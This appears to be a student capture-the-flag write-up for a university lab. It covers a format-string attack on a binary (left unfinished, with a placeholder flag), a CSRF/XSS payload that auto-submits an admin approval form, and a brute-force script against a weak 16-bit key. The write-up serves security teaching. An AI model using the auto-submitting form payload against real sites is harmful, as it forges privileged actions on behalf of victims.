## British Punctuality

## Final Format
We started by downloading the `program` and running checksec on it:

![Final-1](/Images/Extras/FinalFormat/1.png "1")

Since it has canary and NX we can't use buffer overflow and shellcode, so we need to find another way to get the flag.

Because the `program` requires an input we can try to use a format string vulnerability to leak the flag:

![Final-2](/Images/Extras/FinalFormat/2.png "2")

In order to understand better the `program` we runned inside `gdb` info functions:

![Final-3](/Images/Extras/FinalFormat/3.png "3")

We can see that there's a function called `old_backdoor` that could be our way in. So we analyzed the assembly code of the function:

![Final-4](/Images/Extras/FinalFormat/4.png "4")

To change the return address we need to send a string with the following format:

So now we just need to send the string to the program and we should get the flag.

![Final-5](/Images/Extras/FinalFormat/5.png "5")

```flag{TBD}```

## Echo


## Apply for flag 2

When we open the site we are presented with our `id` for every request needed and there's a input box with a submit button.

Once we submit any text we're redireted to another page. 
![Apply-1](/Images/Extras/ApplyForAFlag/1.png "1")

There's a link to a `page` and when clicked it fowards us to another page with two buttons `Give the flag` and `Mark request as read`.

![Apply-22](/Images/Extras/ApplyForAFlag/2.png "2")

When we click the `Give the flag` button we get a message saying that we need to be admin to do that.
- To activate the `Give the flag` button we need to send a form by post with our `id` to the link that the existing button already sends ("http://ctf-fsi.fe.up.pt:5005/request/" + id + "/approve").
- As this button is disable we need to make a script to click it, so this is the form and script we will submit on the first page where there is an input box:
```html
<form method="POST" action="http://ctf-fsi.fe.up.pt:5005/request/8faa3db714efe9a28f9d38ff65cb2afb58bc10bc/approve" role="form">          
    <div class="submit">                  
        <input type="submit" id="button" value="Give the flag">   
    </div>  
</form>    

<script type="text/javascript"> 
    document.getElementById('button').click();  
</script>
```

- After submitting this form we should be redirected to the page with the flag. But since sometimes javascript blocks some actions we need to disable it in the browser settings.
- Once we do this we just need to refresh the page and the flag will be displayed.

![Apply-3](/Images/Extras/ApplyForAFlag/3.png "3")

```flag{ff16e17b0ebaf6797a844933bab5e03e}```

## NumberStation3

After running the command `nc ctf-fsi.fe.up.pt 6002` we are presented with a huge sequence of characters including numbers.

![Numbers-1](/Images/Extras/NumberStation3/1.png "1")

Once we had properly analyzed the code noticed that there were functions to encode and decode and generate the sequences, so we assumed this where the ones used to generate the sequence given to us.

![Numbers-2](/Images/Extras/NumberStation3/2.png "2")

The function `gen` generates a random 16-byte key. The function starts by using the os.urandom() method to generate a random 16-byte string, which it assigns to the rkey variable. It then iterates over each byte in rkey and uses a bitwise AND operation to set each byte to either 0 or 1, depending on its original value. Finally, the function returns the resulting 16-byte key as a bytes object.

Seing this we kwen we could bruteforce the key and decode the sequence to get the flag and the amount of cicles would only be 2 to the power of 16 because the number has 16 bits and each one can be 0 or 1.

To do so we used the following script:

```python
sequence = !!Sequence given to us thats too big to be written here!!

for _ in range(2**16) :
	tempSeq = gen()
	aux = dec(tempSeq, unhexlify(sequence)).decode('latin1')
	if (aux[0:4] == "flag"):
		print(aux)
		break
```
And after running it we got the flag.

![Numbers-3](/Images/Extras/NumberStation3/3.png "3")

```flag{414c7f8b83b64b4e60990b0da7089b3a}```


